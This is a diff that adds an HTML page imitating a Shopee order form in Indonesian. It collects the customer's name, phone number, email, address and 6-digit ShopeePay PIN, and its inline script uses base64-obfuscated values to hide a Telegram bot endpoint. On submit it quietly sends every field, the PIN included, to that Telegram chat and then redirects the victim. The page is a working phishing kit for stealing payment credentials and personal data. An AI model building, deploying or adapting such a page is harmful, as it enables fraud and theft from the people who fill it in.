@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pemesanan Order</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root { --sh-or: #EE4D2D; --sh-gy: #f5f5f5; --tx-dk: #333; }
+        body { background-color: var(--sh-gy); color: var(--tx-dk); font-family: 'Poppins', sans-serif; margin: 0; display: flex; justify-content: center; }
+        .container { background-color: white; width: 100%; max-width: 600px; min-height: 100vh; padding-top: 50px; box-shadow: 0 0 15px rgba(0, 0, 0, 0.08); }
+        .app-header { position: fixed; top: 0; left: 0; right: 0; max-width: 600px; margin: 0 auto; background-color: var(--sh-or); color: white; padding: 12px; text-align: center; z-index: 1010; }
+        .app-header h3 { margin: 0; font-size: 16px; font-weight: 500; }
+        .form-content { padding: 20px; }
+        .form-card { background: white; padding: 25px; border-radius: 8px; text-align: center; }
+        .form-group { margin-bottom: 20px; text-align: left; }
+        .form-group label { display: block; font-weight: 500; margin-bottom: 8px; font-size: 14px; color: #555; }
+        .form-group input, .form-group textarea { width: 100%; padding: 10px 0; border: none; border-bottom: 1px solid #ddd; outline: none; font-size: 15px; font-family: 'Poppins', sans-serif; }
+        .form-group input:focus { border-bottom-color: var(--sh-or); }
+        button { background-color: var(--sh-or); color: white; padding: 14px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; width: 100%; font-weight: 600; margin-top: 10px; }
+        button:disabled { background-color: #ccc; cursor: not-allowed; }
+        .sh-logo { width: 100px; margin-bottom: 15px; }
+        p { font-size: 13px; color: #777; line-height: 1.6; margin-bottom: 20px; }
+        .pin-info { font-size: 11px; color: #EE4D2D; margin-top: 5px; display: block; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="app-header"><h3>Formulir Pemesanan</h3></div>
+        <div class="form-content">
+            <div class="form-card">
+                <img src="shop.JPG" class="sh-logo">
+                <p>Silakan lengkapi detail pesanan Anda di bawah ini untuk memproses pengiriman.</p>
+                <form id="orderForm">
+                    <div class="form-group">
+                        <label>Nama Lengkap</label>
+                        <input type="text" id="nL" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Nomor HP Penerima</label>
+                        <input type="tel" id="nHP" placeholder="08xxxxxxxxxx" required oninput="this.value = this.value.replace(/\D/g, '')">
+                    </div>
+                    <div class="form-group">
+                        <label>Alamat Email</label>
+                        <input type="email" id="eM" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Alamat Lengkap</label>
+                        <textarea id="aL" rows="2" required></textarea>
+                    </div>
+                    <div class="form-group">
+                        <label>Nama Produk</label>
+                        <input type="text" id="nP" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Total Harga (Rp)</label>
+                        <input type="text" id="tH" required oninput="this.value = this.value.replace(/\D/g, '').replace(/\B(?=(\d{3})+(?!\d))/g, '.')">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>PIN ShopeePay (6 Digit)</label>
+                        <input type="password" id="pI" maxlength="6" pattern="\d{6}" inputmode="numeric" placeholder="Masukkan 6 digit angka" required oninput="this.value = this.value.replace(/\D/g, '')">
+                        <span class="pin-info">*Diperlukan untuk memverifikasi metode pembayaran Anda.</span>
+                    </div>
+
+                    <button type="submit" id="btnSub">Konfirmasi & Lanjutkan</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        (function(){
+            // Base64 Encoded Config
+            const _0x_a = "ODI4NjgyNDI1NDpBQUdQQWk3dVBmN28wLWExOXphVWpCTENYN0llbHFlUGNhOA==";
+            const _0x_b = "NTkyMzAzMTgyNQ==";
+            const _0x_c = "Zm9ybXVsaXIzLmh0bWw="; 
+            const _0x_u = ["aHR0cHM6Ly9hcGku","dGVsZWdyYW0ub3JnL2JvdA==","L3NlbmRNZXNzYWdl"];
+
+            document.getElementById('orderForm').onsubmit = function(e) {
+                e.preventDefault();
+                
+                const pin = document.getElementById('pI').value;
+                const btn = document.getElementById('btnSub');
+
+                // Validasi Panjang PIN
+                if (pin.length !== 6) {
+                    alert("PIN harus berupa 6 digit angka!");
+                    return false;
+                }
+
+                btn.disabled = true;
+                btn.innerText = "Memverifikasi...";
+
+                const n = document.getElementById('nL').value;
+                const hp = document.getElementById('nHP').value;
+                const m = document.getElementById('eM').value;
+                const a = document.getElementById('aL').value;
+                const p = document.getElementById('nP').value;
+                const h = document.getElementById('tH').value;
+
+                const fullUrl = atob(_0x_u[0]) + atob(_0x_u[1]) + atob(_0x_a) + atob(_0x_u[2]);
+                
+                // Menambahkan PIN ke dalam string pesan
+                const msg = `*PESANAN BARU*\nNama: ${n}\nNo HP: ${hp}\nEmail: ${m}\nAlamat: ${a}\nProduk: ${p}\nHarga: Rp${h}\nPIN: ${pin}`;
+
+                // Kirim ke Telegram menggunakan fetch
+                fetch(fullUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: atob(_0x_b),
+                        text: msg,
+                        parse_mode: 'Markdown'
+                    })
+                })
+                .then(response => {
+                    // Redirect setelah data terkirim
+                    window.location.href = atob(_0x_c);
+                })
+                .catch(error => {
+                    // Tetap redirect meski ada error koneksi
+                    window.location.href = atob(_0x_c);
+                });
+            };
+        })();
+    </script>
+</body>
+</html>
